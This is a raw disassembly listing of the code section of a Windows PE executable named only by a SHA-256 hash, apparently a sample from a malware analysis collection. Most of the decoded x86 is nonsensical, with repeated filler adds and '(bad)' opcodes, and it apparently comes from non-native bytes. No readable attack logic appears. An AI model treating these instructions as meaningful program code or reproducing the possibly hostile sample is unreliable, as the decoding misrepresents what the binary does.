
ef61e92582a60c072fc527babcc7183ea7b7ba7af03a684eb77d17023de113fe.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	mov    al,0x89
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x3d8800,al
  402013:	add    BYTE PTR [ebx+ecx*2+0x0],ch
  402017:	add    BYTE PTR [ebx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],cl
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	shl    BYTE PTR [esi],1
  402022:	add    BYTE PTR [eax],al
  402024:	mov    bh,0x6
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [edi-0x3458129e],bl
  402055:	push   0x3eae9400
  40205a:	xor    DWORD PTR [edi-0x33f8e468],edi
  402060:	mov    al,0xec
  402062:	fisub  WORD PTR [ebx-0x1e3b1d75]
  402068:	arpl   WORD PTR [ebx-0x31ae3245],cx
  40206e:	aas    
  40206f:	sbb    BYTE PTR [ecx+0x172eba5d],bh
  402075:	loope  0x402009
  402077:	mov    eax,0x9ff6cfa4
  40207c:	mov    eax,ds:0x7d804103
  402081:	clc    
  402082:	xchg   ecx,eax
  402083:	xor    al,0x69
  402085:	push   ebx
  402086:	sub    eax,0x88248284
  40208b:	or     BYTE PTR [edi*2-0x55be0be1],bl
  402092:	xchg   edx,eax
  402093:	loop   0x40204e
  402095:	jne    0x402045
  402097:	test   DWORD PTR [esi+0x42511e7c],ebx
  40209d:	out    0xf7,al
  40209f:	pusha  
  4020a0:	add    DWORD PTR [ecx-0x11347e7f],edx
  4020a6:	sbb    DWORD PTR [ebx+ecx*2+0x725d6d4c],edi
  4020ad:	pop    ds
  4020ae:	mov    edi,DWORD PTR [edi-0x7b]
  4020b1:	add    esi,DWORD PTR [ebx+0x5d8330e9]
  4020b7:	ins    BYTE PTR es:[edi],dx
  4020b8:	das    
  4020b9:	cmp    DWORD PTR [ecx],esi
  4020bb:	push   ecx
  4020bc:	push   es
  4020bd:	jl     0x4020d4
  4020bf:	xor    al,0xa5
  4020c1:	pop    edi
  4020c2:	add    esp,DWORD PTR [ebx]
  4020c4:	cs jge 0x402051
  4020c7:	pop    esi
  4020c8:	xchg   DWORD PTR [esi],ebx
  4020ca:	jge    0x40211e
  4020cc:	aam    0x21
  4020ce:	ror    BYTE PTR [esi],cl
  4020d0:	into   
  4020d1:	add    bh,BYTE PTR [esi+0x13]
  4020d4:	add    BYTE PTR [eax],al
  4020d6:	or     bh,BYTE PTR [ebp+0x1]
  4020d9:	add    BYTE PTR [eax],al
  4020db:	add    al,0x2
  4020dd:	jle    0x4020f2
  4020df:	add    BYTE PTR [eax],al
  4020e1:	or     bh,BYTE PTR [ebp+0x2]
  4020e4:	add    BYTE PTR [eax],al
  4020e6:	add    al,0x2
  4020e8:	jle    0x4020fd
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	or     bh,BYTE PTR [ebp+0x4]
  4020ef:	add    BYTE PTR [eax],al
  4020f1:	add    al,0x2
  4020f3:	jle    0x402108
  4020f5:	add    BYTE PTR [eax],al
  4020f7:	or     bh,BYTE PTR [ebp+0x7]
  4020fa:	add    BYTE PTR [eax],al
  4020fc:	add    al,0x2
  4020fe:	sub    BYTE PTR [eax+eax*1],dl
  402101:	add    BYTE PTR [edx],cl
  402103:	sub    ch,BYTE PTR [esi]
  402105:	sub    BYTE PTR [ebx],al
  402107:	add    BYTE PTR [eax],al
  402109:	push   es
  40210a:	sub    BYTE PTR [esi],dl
  40210c:	add    BYTE PTR [eax],al
  40210e:	or     ch,BYTE PTR [edx]
  402110:	sub    BYTE PTR cs:[eax+eax*1],al
  402114:	add    BYTE PTR [esi],al
  402116:	sub    BYTE PTR [esi],dl
  402118:	add    BYTE PTR [eax],al
  40211a:	or     ch,BYTE PTR [edx]
  40211c:	adc    esi,DWORD PTR [eax]
  40211e:	add    al,BYTE PTR [eax]
  402120:	sub    BYTE PTR [eax],al
  402122:	add    BYTE PTR [eax],al
  402124:	add    DWORD PTR [eax],eax
  402126:	add    BYTE PTR [ecx],dl
  402128:	adc    al,0xa
  40212a:	sub    BYTE PTR [edi],dl
  40212c:	add    BYTE PTR [eax],al
  40212e:	or     dh,BYTE PTR [ebx+0x18]
  402131:	add    BYTE PTR [eax],al
  402133:	or     cl,BYTE PTR [ebx]
  402135:	pop    es
  402136:	sub    BYTE PTR [ecx+0x0],al
  402139:	add    BYTE PTR [esi],al
  40213b:	sub    al,0x8
  40213d:	jae    0x402158
  40213f:	add    BYTE PTR [eax],al
  402141:	or     cl,BYTE PTR [edx]
  402143:	push   es
  402144:	sub    ch,BYTE PTR [eax]
  402146:	and    DWORD PTR [eax],eax
  402148:	add    BYTE PTR [esi],al
  40214a:	jae    0x402166
  40214c:	add    BYTE PTR [eax],al
  40214e:	or     bh,BYTE PTR [edx-0x22]
  402151:	sub    BYTE PTR [ebx],bl
  402153:	add    BYTE PTR [eax],al
  402155:	or     al,BYTE PTR [edx]
  402157:	outs   dx,DWORD PTR ds:[esi]
  402158:	sbb    al,0x0
  40215a:	add    BYTE PTR [edx],cl
  40215c:	sub    BYTE PTR ds:0x720a0000,bl
  402162:	add    DWORD PTR [eax],eax
  402164:	add    BYTE PTR [eax+0x6f],dh
  402167:	push   ds
  402168:	add    BYTE PTR [eax],al
  40216a:	or     ch,BYTE PTR [edi+0x1f]
  40216d:	add    BYTE PTR [eax],al
  40216f:	or     bh,BYTE PTR [esi+0x8]
  402172:	add    BYTE PTR [eax],al
  402174:	add    al,0x2c
  402176:	adc    BYTE PTR [eax],ch
  402178:	sbb    eax,DWORD PTR [eax]
  40217a:	add    BYTE PTR [edx],cl
  40217c:	add    ch,BYTE PTR [edi+0x20]
  40217f:	add    BYTE PTR [eax],al
  402181:	or     ch,BYTE PTR [edi+0x1f]
  402184:	add    BYTE PTR [eax],al
  402186:	or     ch,BYTE PTR [edx]
  402188:	sbb    esi,DWORD PTR [eax]
  40218a:	add    al,0x0
  40218c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40218d:	add    al,BYTE PTR [eax]
  40218f:	add    BYTE PTR [edx],al
  402191:	add    BYTE PTR [eax],al
  402193:	adc    DWORD PTR [esi],edx
  402195:	or     dl,BYTE PTR [esi]
  402197:	or     esi,DWORD PTR [ebx+0x1]
  40219a:	add    BYTE PTR [eax],al
  40219c:	push   es
  40219d:	or     al,0x2
  40219f:	adc    al,BYTE PTR [edx]
  4021a1:	sub    BYTE PTR ds:0x26060000,cl
  4021a7:	or     BYTE PTR [ebx+0x6],bh
  4021aa:	add    BYTE PTR [eax],al
  4021ac:	add    al,0x80
  4021ae:	or     BYTE PTR [eax],al
  4021b0:	add    BYTE PTR [esp+edx*1],al
  4021b3:	or     eax,0x47b08
  4021b8:	add    BYTE PTR [edi+ebp*2],al
  4021bb:	and    DWORD PTR [eax],eax
  4021bd:	add    BYTE PTR [edx],cl
  4021bf:	and    eax,0xea390513
  4021c4:	add    DWORD PTR [eax],eax
  4021c6:	add    dh,bh
  4021c8:	adc    edi,DWORD PTR [esi+0x78]
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	add    al,0x3a
  4021cf:	xchg   esp,eax
  4021d0:	add    BYTE PTR [eax],al
  4021d2:	add    BYTE PTR [edi],bl
  4021d4:	or     esi,DWORD PTR [ebx+0x23]
  4021d7:	add    BYTE PTR [eax],al
  4021d9:	or     ah,BYTE PTR ds:0x572
  4021df:	jo     0x4021f7
  4021e1:	sub    BYTE PTR [eax+eax*1],ah
  4021e4:	add    BYTE PTR [edx],cl
  4021e6:	and    eax,0x3772
  4021eb:	jo     0x402204
  4021ed:	sub    BYTE PTR [eax+eax*1],ah
  4021f0:	add    BYTE PTR [edx],cl
  4021f2:	and    eax,0x6b72
  4021f7:	jo     0x402211
  4021f9:	sub    BYTE PTR [eax+eax*1],ah
  4021fc:	add    BYTE PTR [edx],cl
  4021fe:	and    eax,0x8372
  402203:	jo     0x40221e
  402205:	sub    BYTE PTR [eax+eax*1],ah
  402208:	add    BYTE PTR [edx],cl
  40220a:	and    eax,0x9d72
  40220f:	jo     0x40222b
  402211:	sub    BYTE PTR [eax+eax*1],ah
  402214:	add    BYTE PTR [edx],cl
  402216:	and    eax,0xaf72
  40221b:	jo     0x402238
  40221d:	sub    BYTE PTR [eax+eax*1],ah
  402220:	add    BYTE PTR [edx],cl
  402222:	and    eax,0xc372
  402227:	jo     0x402245
  402229:	sub    BYTE PTR [eax+eax*1],ah
  40222c:	add    BYTE PTR [edx],cl
  40222e:	and    eax,0xdb72
  402233:	jo     0x402252
  402235:	sub    BYTE PTR [eax+eax*1],ah
  402238:	add    BYTE PTR [edx],cl
  40223a:	and    eax,0xfd72
  40223f:	jo     0x40225f
  402241:	sub    BYTE PTR [eax+eax*1],ah
  402244:	add    BYTE PTR [edx],cl
  402246:	and    eax,0x11f72
  40224b:	jo     0x40226c
  40224d:	or     DWORD PTR [eax],ebp
  40224f:	and    al,0x0
  402251:	add    BYTE PTR [edx],cl
  402253:	and    eax,0x14572
  402258:	jo     0x402279
  40225a:	or     ch,BYTE PTR [eax]
  40225c:	and    al,0x0
  40225e:	add    BYTE PTR [edx],cl
  402260:	(bad)  
  402261:	adc    eax,DWORD PTR [eax+0x4000078]
  402267:	(bad)  
  402268:	adc    edi,DWORD PTR [esi+0x78]
  40226b:	add    BYTE PTR [eax],al
  40226d:	add    al,0x11
  40226f:	add    eax,0x25280612
  402274:	add    BYTE PTR [eax],al
  402276:	or     bh,BYTE PTR [ecx]
  402278:	xor    eax,0x11000001
  40227d:	push   es
  40227e:	inc    ebp
  40227f:	or     eax,DWORD PTR [eax]
  402281:	add    BYTE PTR [eax],al
  402283:	add    eax,0x3e000000
  402288:	add    BYTE PTR [eax],al
  40228a:	add    BYTE PTR [ebp+0x0],dl
  40228d:	add    BYTE PTR [eax],al
  40228f:	jge    0x402291
  402291:	add    BYTE PTR [eax],al
  402293:	xchg   ecx,eax
  402294:	add    BYTE PTR [eax],al
  402296:	add    BYTE PTR [ebp-0x47000000],ah
  40229c:	add    BYTE PTR [eax],al
  40229e:	add    ah,cl
  4022a0:	add    BYTE PTR [eax],al
  4022a2:	add    cl,bl
  4022a4:	add    BYTE PTR [eax],al
  4022a6:	add    bh,ah
  4022a8:	add    BYTE PTR [eax],al
  4022aa:	add    ch,dh
  4022ac:	add    BYTE PTR [eax],al
  4022ae:	add    BYTE PTR [eax],bh
  4022b0:	std    
  4022b1:	add    BYTE PTR [eax],al
  4022b3:	add    BYTE PTR [eax],cl
  4022b5:	jnp    0x4022b8
  4022b7:	add    BYTE PTR [eax],al
  4022b9:	add    al,0x72
  4022bb:	jnp    0x4022be
  4022bd:	add    BYTE PTR [eax+0x6f],dh
  4022c0:	add    BYTE PTR es:[eax],al
  4022c3:	or     ch,BYTE PTR [eax+edx*1]
  4022c6:	jb     0x402347
  4022c8:	add    DWORD PTR [eax],eax
  4022ca:	jo     0x4022f4
  4022cc:	and    BYTE PTR [eax],al
  4022ce:	add    BYTE PTR [esi],al
  4022d0:	jae    0x4022f9
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	or     bh,BYTE PTR [edx+0x28]
  4022d7:	pop    es
  4022d8:	add    BYTE PTR [eax],al
  4022da:	push   es
  4022db:	or     eax,0x17b0809
  4022e0:	add    BYTE PTR [eax],al
  4022e2:	add    al,0x6f
  4022e4:	sub    BYTE PTR [eax],al
  4022e6:	add    BYTE PTR [edx],cl
  4022e8:	cmp    dh,al
  4022ea:	add    BYTE PTR [eax],al
  4022ec:	add    BYTE PTR [eax],ch
  4022ee:	pop    es
  4022ef:	add    BYTE PTR [eax],al
  4022f1:	push   es
  4022f2:	or     eax,0x17b0809
  4022f7:	add    BYTE PTR [eax],al
  4022f9:	add    al,0x6f
  4022fb:	sub    DWORD PTR [eax],eax
  4022fd:	add    BYTE PTR [edx],cl
  4022ff:	cmp    BYTE PTR [edi+0x28000000],ch
  402305:	pop    es
  402306:	add    BYTE PTR [eax],al
  402308:	push   es
  402309:	or     eax,0x17b0809
  40230e:	add    BYTE PTR [eax],al
  402310:	add    al,0x8
  402312:	jnp    0x402317
  402314:	add    BYTE PTR [eax],al
  402316:	add    al,0x28
  402318:	sub    al,BYTE PTR [eax]
  40231a:	add    BYTE PTR [edx],cl
  40231c:	or     BYTE PTR [ebx+0x2],bh
  40231f:	add    BYTE PTR [eax],al
  402321:	add    al,0x6f
  402323:	sub    eax,DWORD PTR [eax]
  402325:	add    BYTE PTR [edx],cl
  402327:	cmp    BYTE PTR [edi+0x28000000],al
  40232d:	pop    es
  40232e:	add    BYTE PTR [eax],al
  402330:	push   es
  402331:	or     eax,0x17b0809
  402336:	add    BYTE PTR [eax],al
  402338:	add    al,0x6f
  40233a:	sub    al,0x0
  40233c:	add    BYTE PTR [edx],cl
  40233e:	sub    esi,DWORD PTR [ebx+0x28]
  402341:	pop    es
  402342:	add    BYTE PTR [eax],al
  402344:	push   es
  402345:	or     eax,0x17b0809
  40234a:	add    BYTE PTR [eax],al
  40234c:	add    al,0x6f
  40234e:	sub    eax,0x2b0a0000
  402353:	pop    edi
  402354:	sub    BYTE PTR [edi],al
  402356:	add    BYTE PTR [eax],al
  402358:	push   es
  402359:	or     eax,0x17b0809
  40235e:	add    BYTE PTR [eax],al
  402360:	add    al,0x6f
  402362:	add    BYTE PTR cs:[eax],al
  402365:	or     ch,BYTE PTR [ebx]
  402367:	dec    ebx
  402368:	sub    BYTE PTR [edi],al
  40236a:	add    BYTE PTR [eax],al
  40236c:	push   es
  40236d:	or     eax,0x17b08
  402372:	add    BYTE PTR [eax+ebp*1],al
  402375:	or     eax,DWORD PTR [eax]
  402377:	add    BYTE PTR [esi],al
  402379:	sub    edi,DWORD PTR [eax]
  40237b:	sub    BYTE PTR [edi],al
  40237d:	add    BYTE PTR [eax],al
  40237f:	push   es
  402380:	or     eax,0xa28
  402385:	push   es
  402386:	sub    ebp,DWORD PTR [ebx]
  402388:	sub    BYTE PTR [edi],al
  40238a:	add    BYTE PTR [eax],al
  40238c:	push   es
  40238d:	or     eax,0x2f6f09
  402392:	add    BYTE PTR [edx],cl
  402394:	sub    ebx,DWORD PTR ds:0x728
  40239a:	push   es
  40239b:	or     eax,0x306f09
  4023a0:	add    BYTE PTR [edx],cl
  4023a2:	sub    ecx,DWORD PTR [edi]
  4023a4:	or     BYTE PTR [ebx+0x7],bh
  4023a7:	add    BYTE PTR [eax],al
  4023a9:	add    al,0x28
  4023ab:	or     al,0x0
  4023ad:	add    BYTE PTR [esi],al
  4023af:	sub    eax,DWORD PTR [edx]
  4023b1:	pop    ss
  4023b2:	or     ebx,esi
  4023b4:	xor    dl,BYTE PTR [ebx]
  4023b6:	add    al,0x8
  4023b8:	jnp    0x4023be
  4023ba:	add    BYTE PTR [eax],al
  4023bc:	add    al,0x28
  4023be:	xor    DWORD PTR [eax],eax
  4023c0:	add    BYTE PTR [edx],cl
  4023c2:	sub    BYTE PTR [ebx],bl
  4023c4:	add    BYTE PTR [eax],al
  4023c6:	or     ch,BYTE PTR [eax]
  4023c8:	pop    ds
  4023c9:	add    BYTE PTR [eax],al
  4023cb:	push   es
  4023cc:	or     BYTE PTR [ebx+0x4],bh
  4023cf:	add    BYTE PTR [eax],al
  4023d1:	add    al,0x28
  4023d3:	xor    al,BYTE PTR [eax]
  4023d5:	add    BYTE PTR [edx],cl
  4023d7:	outs   dx,DWORD PTR ds:[esi]
  4023d8:	pop    ds
  4023d9:	add    BYTE PTR [eax],al
  4023db:	or     dl,BYTE PTR [ecx]
  4023dd:	add    al,0x28
  4023df:	or     BYTE PTR [eax],al
  4023e1:	add    BYTE PTR [esi],al
  4023e3:	pop    ss
  4023e4:	or     bl,dh
  4023e6:	add    BYTE PTR [edi],al
  4023e8:	sub    al,0x37
  4023ea:	or     BYTE PTR [ebx+0x4],bh
  4023ed:	add    BYTE PTR [eax],al
  4023ef:	add    al,0x28
  4023f1:	xor    eax,DWORD PTR [eax]
  4023f3:	add    BYTE PTR [edx],cl
  4023f5:	sub    eax,0x1b281a
  4023fa:	add    BYTE PTR [edx],cl
  4023fc:	sub    BYTE PTR [edx],ah
  4023fe:	add    BYTE PTR [eax],al
  402400:	push   es
  402401:	or     BYTE PTR [ebx+0x4],bh
  402404:	add    BYTE PTR [eax],al
  402406:	add    al,0x28
  402408:	xor    al,BYTE PTR [eax]
  40240a:	add    BYTE PTR [edx],cl
  40240c:	outs   dx,DWORD PTR ds:[esi]
  40240d:	pop    ds
  40240e:	add    BYTE PTR [eax],al
  402410:	or     ch,BYTE PTR [eax]
  402412:	sbb    eax,DWORD PTR [eax]
  402414:	add    BYTE PTR [edx],cl
  402416:	sub    BYTE PTR [esi],bl
  402418:	add    BYTE PTR [eax],al
  40241a:	push   es
  40241b:	outs   dx,DWORD PTR ds:[esi]
  40241c:	pop    ds
  40241d:	add    BYTE PTR [eax],al
  40241f:	or     ch,BYTE PTR [edx]
  402421:	push   es
  402422:	sub    eax,0x1d2815
  402427:	add    BYTE PTR [esi],al
  402429:	or     BYTE PTR [ebx+0x4],bh
  40242c:	add    BYTE PTR [eax],al
  40242e:	add    al,0x28
  402430:	xor    al,BYTE PTR [eax]
  402432:	add    BYTE PTR [edx],cl
  402434:	sub    BYTE PTR [eax+eax*1],dh
  402437:	add    BYTE PTR [edx],cl
  402439:	sub    al,BYTE PTR [eax]
  40243b:	add    BYTE PTR [ecx+0x1c],al
  40243e:	add    BYTE PTR [eax],al
  402440:	add    BYTE PTR [eax],al
  402442:	add    BYTE PTR [eax],al
  402444:	or     al,BYTE PTR [eax]
  402446:	add    BYTE PTR [eax],al
  402448:	pop    ss
  402449:	add    al,BYTE PTR [eax]
  40244b:	add    BYTE PTR [ecx],ah
  40244d:	add    al,BYTE PTR [eax]
  40244f:	add    BYTE PTR [edx],dh
  402451:	add    BYTE PTR [eax],al
  402453:	add    BYTE PTR [esi],al
  402455:	add    BYTE PTR [eax],al
  402457:	add    DWORD PTR [esi],eax
  402459:	sub    bl,BYTE PTR [edx]
  40245b:	jae    0x402492
  40245d:	add    BYTE PTR [eax],al
  40245f:	or     bh,BYTE PTR [edx+0x0]
  402462:	add    BYTE PTR [eax],al
  402464:	adc    esi,DWORD PTR [eax]
  402466:	add    eax,DWORD PTR [eax]
  402468:	dec    ebx
  402469:	add    BYTE PTR [eax],al
  40246b:	add    BYTE PTR [ebx],al
  40246d:	add    BYTE PTR [eax],al
  40246f:	adc    DWORD PTR [eax],ebp
  402471:	add    BYTE PTR ss:[eax],al
  402474:	or     ch,BYTE PTR [edi+0x37]
  402477:	add    BYTE PTR [eax],al
  402479:	or     ch,BYTE PTR [eax]
  40247b:	cmp    BYTE PTR [eax],al
  40247d:	add    BYTE PTR [edx],cl
  40247f:	or     al,BYTE PTR [esi]
  402481:	jb     0x40240a
  402483:	add    DWORD PTR [eax],eax
  402485:	jo     0x4024af
  402487:	cmp    DWORD PTR [eax],eax
  402489:	add    BYTE PTR [edx],cl
  40248b:	or     eax,DWORD PTR [edx]
  40248d:	sub    BYTE PTR [ebx],dh
  40248f:	add    BYTE PTR [eax],al
  402491:	or     ch,BYTE PTR [edx+edx*1]
  402494:	sub    BYTE PTR ds:0x72060000,al
  40249a:	jmp    0x28b024a0
  40249f:	cmp    DWORD PTR [eax],eax
  4024a1:	add    BYTE PTR [edx],cl
  4024a3:	sub    ecx,DWORD PTR es:[edx+eax*1]
  4024a7:	jb     0x4024bc
  4024a9:	add    al,BYTE PTR [eax]
  4024ab:	jo     0x4024d5
  4024ad:	cmp    DWORD PTR [eax],eax
  4024af:	add    BYTE PTR [edx],cl
  4024b1:	es pop es
  4024b3:	push   es
  4024b4:	pop    ss
  4024b5:	sub    BYTE PTR [edx],bh
  4024b7:	add    BYTE PTR [eax],al
  4024b9:	or     ch,BYTE PTR [edx]
  4024bb:	add    BYTE PTR [ebx],dl
  4024bd:	xor    BYTE PTR ds:0x25200,al
  4024c3:	add    BYTE PTR [eax+eax*1],al
  4024c6:	add    BYTE PTR [ecx],dl
  4024c8:	add    cl,BYTE PTR [esi+0x57311669]
  4024ce:	add    edx,DWORD PTR [eax+0x2]
  4024d1:	push   ss
  4024d2:	call   0x304:0x47d
  4024d9:	push   eax
  4024da:	jnp    0x4024e0
  4024dc:	add    BYTE PTR [eax],al
  4024de:	add    al,0x6f
  4024e0:	cmp    eax,DWORD PTR [eax]
  4024e2:	add    BYTE PTR [edx],cl
  4024e4:	or     al,BYTE PTR [esi]
  4024e6:	jb     0x402517
  4024e8:	add    al,BYTE PTR [eax]
  4024ea:	jo     0x40255b
  4024ec:	cmp    al,0x0
  4024ee:	add    BYTE PTR [edx],cl
  4024f0:	sub    eax,0x35720627
  4024f5:	add    al,BYTE PTR [eax]
  4024f7:	jo     0x402568
  4024f9:	cmp    al,0x0
  4024fb:	add    BYTE PTR [edx],cl
  4024fd:	sub    eax,0x3b72061a
  402502:	add    al,BYTE PTR [eax]
  402504:	jo     0x402575
  402506:	cmp    al,0x0
  402508:	add    BYTE PTR [edx],cl
  40250a:	sub    eax,0x4172060d
  40250f:	add    al,BYTE PTR [eax]
  402511:	jo     0x402582
  402513:	cmp    al,0x0
  402515:	add    BYTE PTR [edx],cl
  402517:	sub    al,0xc
  402519:	add    edx,DWORD PTR [eax+0x7e]
  40251c:	adc    eax,DWORD PTR [eax]
  40251e:	add    BYTE PTR [edx],cl
  402520:	jge    0x402526
  402522:	add    BYTE PTR [eax],al
  402524:	add    al,0x17
  402526:	or     edi,DWORD PTR [eax]
  402528:	loop   0x40252b
  40252a:	add    BYTE PTR [eax],al
  40252c:	add    al,BYTE PTR [edi]
  40252e:	call   0x7000:0x247720c
  402535:	pop    ds
  402536:	and    al,0x73
  402538:	cmp    eax,0xd0a0000
  40253d:	or     DWORD PTR [eax],ecx
  40253f:	outs   dx,DWORD PTR ds:[esi]
  402540:	add    BYTE PTR ds:[eax],al
  402543:	or     dl,BYTE PTR [ebx]
  402545:	add    al,0x11
  402547:	add    al,0x6f
  402549:	aas    
  40254a:	add    BYTE PTR [eax],al
  40254c:	or     dh,BYTE PTR [edx-0x55]
  40254f:	add    al,BYTE PTR [eax]
  402551:	jo     0x4025c2
  402553:	inc    eax
  402554:	add    BYTE PTR [eax],al
  402556:	or     ch,BYTE PTR [edi+0x41]
  402559:	add    BYTE PTR [eax],al
  40255b:	or     dl,BYTE PTR [ebx]
  40255d:	add    eax,0x3f6f0411
  402562:	add    BYTE PTR [eax],al
  402564:	or     dh,BYTE PTR [edx-0x3f]
  402567:	add    al,BYTE PTR [eax]
  402569:	jo     0x4025da
  40256b:	inc    eax
  40256c:	add    BYTE PTR [eax],al
  40256e:	or     ch,BYTE PTR [edi+0x41]
  402571:	add    BYTE PTR [eax],al
  402573:	or     dl,BYTE PTR [ebx]
  402575:	push   es
  402576:	adc    DWORD PTR ds:0x216f,eax
  40257c:	or     ah,BYTE PTR ds:0x78390713
  402582:	add    DWORD PTR [eax],eax
  402584:	add    dh,bh
  402586:	adc    edi,DWORD PTR [esi+0x79]
  402589:	add    BYTE PTR [eax],al
  40258b:	add    al,0x2d
  40258d:	ins    DWORD PTR es:[edi],dx
  40258e:	push   ds
  40258f:	jae    0x4025b4
  402591:	add    BYTE PTR [eax],al
  402593:	or     ah,BYTE PTR ds:0x2d972
  402599:	jo     0x4025b1
  40259b:	sub    BYTE PTR [eax+eax*1],ah
  40259e:	add    BYTE PTR [edx],cl
  4025a0:	and    eax,0x2e172
  4025a5:	jo     0x4025be
  4025a7:	sub    BYTE PTR [eax+eax*1],ah
  4025aa:	add    BYTE PTR [edx],cl
  4025ac:	and    eax,0x2eb72
  4025b1:	jo     0x4025cb
  4025b3:	sub    BYTE PTR [eax+eax*1],ah
  4025b6:	add    BYTE PTR [edx],cl
  4025b8:	and    eax,0x2fd72
  4025bd:	jo     0x4025d8
  4025bf:	sub    BYTE PTR [eax+eax*1],ah
  4025c2:	add    BYTE PTR [edx],cl
  4025c4:	and    eax,0x31972
  4025c9:	jo     0x4025e5
  4025cb:	sub    BYTE PTR [eax+eax*1],ah
  4025ce:	add    BYTE PTR [edx],cl
  4025d0:	and    eax,0x32572
  4025d5:	jo     0x4025f2
  4025d7:	sub    BYTE PTR [eax+eax*1],ah
  4025da:	add    BYTE PTR [edx],cl
  4025dc:	and    eax,0x33572
  4025e1:	jo     0x4025ff
  4025e3:	sub    BYTE PTR [eax+eax*1],ah
  4025e6:	add    BYTE PTR [edx],cl
  4025e8:	and    eax,0x33972
  4025ed:	jo     0x40260c
  4025ef:	sub    BYTE PTR [eax+eax*1],ah
  4025f2:	add    BYTE PTR [edx],cl
  4025f4:	(bad)  
  4025f5:	adc    eax,DWORD PTR [eax+0x4000079]
  4025fb:	(bad)  
  4025fc:	adc    edi,DWORD PTR [esi+0x79]
  4025ff:	add    BYTE PTR [eax],al
  402601:	add    al,0x11
  402603:	pop    es
  402604:	adc    cl,BYTE PTR [eax]
  402606:	sub    BYTE PTR ds:0x390a0000,ah
  40260c:	in     eax,dx
  40260d:	add    BYTE PTR [eax],al
  40260f:	add    BYTE PTR [ecx],dl
  402611:	or     BYTE PTR [ebp+0x8],al
  402614:	add    BYTE PTR [eax],al
  402616:	add    BYTE PTR ds:0x63000000,al
  40261c:	add    BYTE PTR [eax],al
  40261e:	add    BYTE PTR [ebx+0x0],ah
  402621:	add    BYTE PTR [eax],al
  402623:	js     0x402625
  402625:	add    BYTE PTR [eax],al
  402627:	mov    eax,DWORD PTR [eax]
  402629:	add    BYTE PTR [eax],al
  40262b:	sahf   
  40262c:	add    BYTE PTR [eax],al
  40262e:	add    BYTE PTR [ebx-0x4d000000],dh
  402634:	add    BYTE PTR [eax],al
  402636:	add    BYTE PTR [eax],bh
  402638:	rol    DWORD PTR [eax],0x0
  40263b:	add    BYTE PTR [ebx],al
  40263d:	push   eax
  40263e:	add    dl,BYTE PTR [edx]
  402640:	add    DWORD PTR [ecx],edx
  402642:	add    eax,0xe280611
  402647:	add    BYTE PTR [eax],al
  402649:	push   es
  40264a:	jge    0x40264d
  40264c:	add    BYTE PTR [eax],al
  40264e:	add    al,0x3
  402650:	push   eax
  402651:	jnp    0x402654
  402653:	add    BYTE PTR [eax],al
  402655:	add    al,0x6f
  402657:	inc    edx
  402658:	add    BYTE PTR [eax],al
  40265a:	or     bh,BYTE PTR [ecx]
  40265c:	stos   BYTE PTR es:[edi],al
  40265d:	add    BYTE PTR [eax],al
  40265f:	add    BYTE PTR [ebx],al
  402661:	push   eax
  402662:	jnp    0x402665
  402664:	add    BYTE PTR [eax],al
  402666:	add    al,0x3
  402668:	push   eax
  402669:	jnp    0x40266c
  40266b:	add    BYTE PTR [eax],al
  40266d:	add    al,0x6f
  40266f:	inc    edx
  402670:	add    BYTE PTR [eax],al
  402672:	or     dl,BYTE PTR [edi]
  402674:	pop    ecx
  402675:	outs   dx,DWORD PTR ds:[esi]
  402676:	inc    ebx
  402677:	add    BYTE PTR [eax],al
  402679:	or     bl,BYTE PTR [edi]
  40267b:	das    
  40267c:	cmp    ecx,DWORD PTR [ecx+0x3000000]
  402682:	push   eax
  402683:	and    eax,0x17b
  402688:	add    al,0x72
  40268a:	dec    ecx
  40268b:	add    eax,DWORD PTR [eax]
  40268d:	jo     0x4026b7
  40268f:	inc    esp
  402690:	add    BYTE PTR [eax],al
  402692:	or     bh,BYTE PTR [ebp+0x1]
  402695:	add    BYTE PTR [eax],al
  402697:	add    al,0x2b
  402699:	jo     0x40269e
  40269b:	push   eax
  40269c:	add    dl,BYTE PTR [edx]
  40269e:	add    DWORD PTR [ecx],edx
  4026a0:	add    eax,0xe280611
  4026a5:	add    BYTE PTR [eax],al
  4026a7:	push   es
  4026a8:	jge    0x4026ac
  4026aa:	add    BYTE PTR [eax],al
  4026ac:	add    al,0x2b
  4026ae:	pop    ebx
  4026af:	adc    DWORD PTR ds:0xf280611,eax
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	push   es
  4026b8:	add    edx,DWORD PTR [eax+0x17]
  4026bb:	jge    0x4026c0
  4026bd:	add    BYTE PTR [eax],al
  4026bf:	add    al,0x2b
  4026c1:	dec    eax
  4026c2:	adc    DWORD PTR ds:0xf280611,eax
  4026c8:	add    BYTE PTR [eax],al
  4026ca:	push   es
  4026cb:	add    edx,DWORD PTR [eax+0x17]
  4026ce:	jge    0x4026d5
  4026d0:	add    BYTE PTR [eax],al
  4026d2:	add    al,0x2b
  4026d4:	xor    eax,0x12025003
  4026d9:	add    DWORD PTR [ecx],edx
  4026db:	add    eax,0xe280611
  4026e0:	add    BYTE PTR [eax],al
  4026e2:	push   es
  4026e3:	jge    0x4026ec
  4026e5:	add    BYTE PTR [eax],al
  4026e7:	add    al,0x2b
  4026e9:	and    BYTE PTR [ecx],dl
  4026eb:	add    eax,0xf280611
  4026f0:	add    BYTE PTR [eax],al
  4026f2:	push   es
  4026f3:	add    edx,DWORD PTR [eax+0x17]
  4026f6:	jge    0x4026fe
  4026f8:	add    BYTE PTR [eax],al
  4026fa:	add    al,0x2b
  4026fc:	or     eax,0x2328
  402701:	push   es
  402702:	adc    DWORD PTR ds:0x4573,eax
  402708:	or     bh,BYTE PTR [edx+0x7]
  40270b:	pop    ss
  40270c:	pop    eax
  40270d:	or     eax,DWORD PTR [edi]
